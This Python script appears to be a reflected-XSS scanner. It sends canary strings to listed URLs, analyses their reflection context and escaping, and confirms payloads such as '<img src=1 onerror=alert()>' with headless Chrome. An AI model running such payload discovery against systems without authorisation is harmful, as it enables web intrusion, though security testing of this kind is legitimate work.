
# ------initial scan----------
import requests
import urllib.parse
import re
import string

class reflection_point:
  def __init__(self,response_text,reflected_position,letters_to_check):
    self.response_text = response_text
    self.reflected_position = reflected_position
    self.letters_to_check = letters_to_check
    self.analyze_reflection()
  def analyze_reflection(self):
    self.extract_reflected_payload()
    self.set_nested_tag()
    self.set_is_in_tag()
    self.set_is_in_script()
    self.set_is_in_quote()
    self.check_letter_availability()
  def extract_reflected_payload(self):
    reflected_portion = self.response_text[self.reflected_position:]
    payload_end = reflected_portion.find(payload[-6:])+6
    self.reflected_payload = reflected_portion[:payload_end]
  def set_nested_tag(self):
    tag_start = self.response_text[:self.reflected_position].rfind("<")
    tag_end = self.reflected_position + len(self.reflected_payload) + self.response_text[self.reflected_position+len(self.reflected_payload):].find(">")
    self.nested_tag = self.response_text[tag_start:tag_end+1]
    self.nested_tagname = self.nested_tag[2:self.nested_tag.find(" ")]
  def set_is_in_tag(self):
    if self.nested_tag[1:].find("<")==-1:
      self.is_in_tag = True
    else:
      self.is_in_tag = False
  def set_is_in_script(self):
    self.is_in_script = (self.nested_tagname == "script")
  def set_is_in_quote(self):
    self.is_in_quote = False
    self.quote_type = None
    if self.is_in_tag:
      matches = list(re.finditer(r'(?:"[^"\\]*(?:\\.[^"\\]*)*"|\'[^\'\\]*(?:\\.[^\'\\]*)*\')', self.nested_tag))
      for match in matches:
        if match.start() <= self.nested_tag.find(self.reflected_payload) <= match.end() - 1:
          self.is_in_quote = True
          self.quote_type = self.nested_tag[match.start()]
  def is_in_safe_tag(self):
    pass
  def check_letter_availability(self):
    self.available_letters = []
    self.escaped_letters = []
    for letter in self.letters_to_check:
      if self.reflected_payload.find(payload[payload.find(letter)-2:payload.find(letter)+3])!=-1:
        self.available_letters.append(letter)
      else:
        self.escaped_letters.append(letter)

def check_XSS_probability(rp):
  XSS_status = "To Be Assessed."
  if rp.is_in_tag:
    if rp.is_in_quote:
      can_escape_quote = (rp.quote_type in rp.available_letters)
      if can_escape_quote:
        XSS_status = "XSS likely."
      else:
        XSS_status = "No XSS likely."
    else:
      XSS_status = "XSS likely."
  else:
    if "<" in rp.escaped_letters:
      XSS_status = "No XSS likely."
    else:
      XSS_status = "XSS likely."
  print(XSS_status)
  return XSS_status

def craft_payload_string(letters_to_check):
  payload = "xxxx"
  num = 0
  for letter in letters_to_check:
    payload = payload+str(num%10)+string.ascii_lowercase[num%26]
    num += 1
    payload = payload+str(num%10)+string.ascii_lowercase[num%26]+letter
    num += 1
  payload = payload+str(num%10)+string.ascii_lowercase[num%26]
  num += 1
  payload = payload+str(num%10)+string.ascii_lowercase[num%26]
  num += 1
  payload += "xxxx"
  print("Crafted payload:",payload)
  return payload

#------PoC Crafting--------
# selenium https://zenn.dev/honehone/articles/482f9a3b5ca481
from selenium import webdriver
from selenium.webdriver import ChromeOptions
from selenium.webdriver.common.alert import Alert
from selenium.common.exceptions import NoAlertPresentException
import time
import chromedriver_binary

def craft_poc_payload(rp):
  payload = ""
  XSS_status = False
  poc = "alert()"
  quote = ""
  
  print("Crafting various payloads...")
  if rp.is_in_quote:
    quote = rp.quote_type
  tags = ["img"]
  event_handlers = ["onload=","autofocus onfocus=","onerror="]
  script_runner_tags_special = ["<img src=1 {event_handler}{poc}>","<img src=javascript:{poc}>","<a href src=javascript:{poc}>"]
  
  if rp.is_in_script:
    payload = poc
    XSS_status = is_poc_working(payload)
  elif rp.is_in_tag:
    if rp.is_in_quote:
      payload = payload + quote + " " + "{event_handler}" + quote
    else:
      payload = payload + " " + "{event_handler}"
      
    for eh in event_handlers:
      tmp_payload = payload.format(event_handler=eh) + poc
      XSS_status = is_poc_working(tmp_payload)
      if XSS_status:
        payload = tmp_payload
        break
  else:
    script_runner = "<script>{poc}</script>"
    tmp_payload = script_runner.format(poc=poc)
    XSS_status = is_poc_working(tmp_payload)
    if XSS_status:
      payload = tmp_payload
    else:
      for script_runner in script_runner_tags_special:
        for eh in event_handlers:
          tmp_payload = script_runner.format(event_handler=eh,poc=poc)
          XSS_status = is_poc_working(tmp_payload)
          if XSS_status:
            payload = tmp_payload
            break
            break
      for tag in tags:
        for eh in event_handlers:
          tmp_payload = "<{tag} {event_handler}{poc}>".format(tag=tag,event_handler=eh,poc=poc)
          XSS_status = is_poc_working(tmp_payload)
          if XSS_status:
            payload = tmp_payload
            break
            break
  if XSS_status:
    print("PoC FOUND!!! :",payload)
    return payload
  else:
    print("No PoC FOUND...")
    return None

def is_poc_working(payload):
  XSS_status = False
  options = ChromeOptions()
  options.add_argument("--headless")
  options.add_argument("--no-sandbox")
  driver = webdriver.Chrome(options=options)
  url = target+urllib.parse.quote(payload)
  try:
    driver.get(url)
    time.sleep(2)
    alert = driver.switch_to.alert
    alert.accept()  # アラートを閉じる
    XSS_status = True
  except NoAlertPresentException:
    pass
  finally:
    driver.quit()
  return XSS_status

#-----main-----
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target',help='Path to a file containing targets.',dest='target')
args = parser.parse_args()

f = open(args.target,'r')
target_list = f.readlines()
for index in range(len(target_list)):
  target_list[index] = target_list[index].rstrip('\n')
f.close()

letters_to_check = ["<","\"","'","&","\\"]
payload = craft_payload_string(letters_to_check) # global
XSS_entry_points = []
for target in target_list:
  # Initial Scan
  print("=======================")
  print(target)
  print("----Initiial scan----")
  request_text = target+urllib.parse.quote(payload)
  response = requests.get(request_text)
  response_text = response.text
  reflected_points = list(re.finditer(payload[:6], response_text)) 
  # Without converting it to list, the iterater will be "consumed" once it has been accessed.
  if len(reflected_points)==0:
    print("No reflected value.")
  else:
    for match in reflected_points:
      print("----Initiial scan - checking filters and escapes----")
      position = match.start()
      rp = reflection_point(response_text, position,letters_to_check)
      print("Reflected payload found:",rp.nested_tag)
      print("- In Tag:",str(rp.is_in_tag))
      print("- In quote:{} ({})".format(rp.is_in_quote,rp.quote_type))
      print("- Available Letters : ", ' '.join(rp.available_letters),"  (Escaped Letters : ",' '.join(rp.escaped_letters),")")
      XSS_status = check_XSS_probability(rp)
      if XSS_status=="XSS likely.":
        print("----PoC generation----")
        poc = craft_poc_payload(rp)
        if not poc is None:
          XSS_entry_points.append(target+poc)
      print()
  print()
print("===Scan result===")
print(XSS_entry_points)
